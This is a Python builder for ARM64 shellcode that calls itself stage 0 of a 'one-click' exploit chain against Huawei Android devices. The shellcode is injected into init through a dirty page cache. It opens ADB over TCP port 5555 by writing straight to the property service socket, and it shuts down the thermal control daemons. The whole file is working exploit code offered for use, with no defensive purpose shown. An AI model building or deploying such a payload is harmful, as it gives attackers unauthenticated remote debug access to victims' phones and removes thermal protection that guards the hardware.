#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Payload BT: one-shot init payload that (a) enables ADB over TCP 5555 and
(b) disables Huawei thermal control (stop thermal daemons + property).

Direct-return design (never uses the function's patched slots/epilogue), so it
can be deployed on a dirty page cache too.  Fits in 576 bytes.

Deployed as stage 0 of the one-click chain.
"""
import struct
import sys

from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN

END = 0x240            # payload length (0x204..0x21f is overwritten by the native patcher)
FORBIDDEN = (0x204, 0x220)
NOP4 = bytes([0x1f, 0x20, 0x03, 0xd5])

CODE = """
    stp x0, x30, [sp, #-0x10]!
    stp x19, x20, [sp, #-0x10]!
    stp x21, x22, [sp, #-0x10]!
    mov x8, #0xae
    svc #0
    cbnz w0, ret_early
    mov x8, #0xac
    svc #0
    cmp w0, #1
    b.ne ret_early

    mov x0, #-100
    adr x1, marker
    mov x2, #0xc1
    mov x3, #0
    mov x8, #56
    svc #0
    tbnz x0, #63, ret_early
    mov x8, #57
    svc #0

    sub sp, sp, #0x40
    stp xzr, xzr, [sp]
    stp xzr, xzr, [sp, #0x10]
    stp xzr, xzr, [sp, #0x20]
    stp xzr, xzr, [sp, #0x30]
    mov w9, #1
    strh w9, [sp, #6]
    adr x9, sockpath
    ldp x10, x11, [x9]
    ldp x12, x13, [x9, #0x10]
    stp x10, x11, [sp, #8]
    stp x12, x13, [sp, #24]

    adr x20, msgtab
    mov x21, x20
    mov x22, #6
loop:
    ldp w9, w10, [x21], #8
    mov x0, #1
    mov x1, #1
    mov x2, xzr
    mov x8, #198
    svc #0
    tbnz x0, #63, ret_sp_add
    mov x19, x0
    mov x0, x19
    mov x1, sp
    add x1, x1, #6
    mov x2, #31
    mov x8, #203
    svc #0
    tbnz x0, #63, close_and_next
    add x1, x20, x9
    mov x2, x10
    mov x0, x19
    mov x8, #64
    svc #0
close_and_next:
    mov x0, x19
    mov x8, #57
    svc #0
    subs w22, w22, #1
    b.ne loop

    add sp, sp, #0x40
    b ret_early

ret_sp_add:
    add sp, sp, #0x40
ret_early:
    ldp x21, x22, [sp], #0x10
    ldp x19, x20, [sp], #0x10
    ldp x0, x30, [sp], #0x10
    ret
"""

MARKER_S = b"/dev/.dbt\x00"
SOCKPATH_S = b"/dev/socket/property_service\x00"


def wire(name: bytes, value: bytes) -> bytes:
    return (struct.pack("<I", 0x00020001) + struct.pack("<I", len(name)) + name
            + struct.pack("<I", len(value)) + value)


MSGS = [
    wire(b"service.adb.tcp.port", b"5555"),
    wire(b"ctl.restart", b"adbd"),
    wire(b"sys.huawei.thermal.enable", b"false"),
    wire(b"ctl.stop", b"hwpged"),
    wire(b"ctl.stop", b"thermal-daemon"),
    wire(b"ctl.stop", b"powerct"),
]
MSG_BLOB = b"".join(MSGS)


def align(x, a=8):
    return (x + a - 1) // a * a


def byte_directive(data):
    return ".byte " + ", ".join("0x%02x" % b for b in data)


def layout_items(items, start, forbidden):
    """Greedy placement with an alignment of 8; items are (bytes,) blobs that
    must stay contiguous and must not overlap `forbidden` [lo, hi)."""
    lo, hi = forbidden
    pos = start
    placed = []
    for blob in items:
        pos = align(pos)
        if pos < hi and pos + len(blob) > lo:
            pos = align(hi)
        placed.append((pos, blob))
        pos += len(blob)
    return placed, pos


def build():
    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    probe = CODE + "\nmarker:\nsockpath:\nmsgtab:\nmsgblob:\n"
    code_len = len(ks.asm(probe, addr=0)[0])

    table = bytearray()
    off = None  # computed after blob placement
    data_start = align(code_len)
    # order: table, blob, marker, sockpath
    table_len = 8 * len(MSGS)
    items = [bytes(table_len), MSG_BLOB, MARKER_S, SOCKPATH_S]
    placed, end = layout_items(items, data_start, FORBIDDEN)
    msgtab_pos = placed[0][0]
    msgblob_pos = placed[1][0]
    marker_pos = placed[2][0]
    sockpath_pos = placed[3][0]
    if end > END:
        raise SystemExit("overflow end=%#x" % end)

    off = msgblob_pos - msgtab_pos
    for m in MSGS:
        table += off.to_bytes(4, "little") + len(m).to_bytes(4, "little")
        off += len(m)

    parts = [CODE]
    parts.append(".org 0x%x" % msgtab_pos)
    parts.append("msgtab:")
    parts.append(byte_directive(table))
    parts.append(".org 0x%x" % msgblob_pos)
    parts.append("msgblob:")
    parts.append(byte_directive(MSG_BLOB))
    parts.append(".org 0x%x" % marker_pos)
    parts.append("marker:")
    parts.append(byte_directive(MARKER_S))
    # filler in the slot area (native patcher overwrites 0x204..0x21b); forward
    # .org only, so emit it before any data placed above 0x220.
    parts.append(".org 0x%x" % FORBIDDEN[0])
    parts.append(byte_directive(NOP4 * 7))
    parts.append(".org 0x%x" % sockpath_pos)
    parts.append("sockpath:")
    parts.append(byte_directive(SOCKPATH_S))
    parts.append(".org 0x%x" % END)
    blob = bytes(ks.asm("\n".join(parts), addr=0)[0])
    if len(blob) != END:
        raise SystemExit("size %#x" % len(blob))
    return blob, dict(code_len=code_len, msgtab=msgtab_pos, msgblob=msgblob_pos,
                      marker=marker_pos, sockpath=sockpath_pos, end=end)


if __name__ == "__main__":
    blob, info = build()
    print("layout:", {k: hex(v) for k, v in info.items()})
    print("size:", len(blob), "entry:", blob[0:16].hex())
    out = sys.argv[1] if len(sys.argv) > 1 else "payload_576_bt.bin"
    open(out, "wb").write(blob)
    print("written", out)
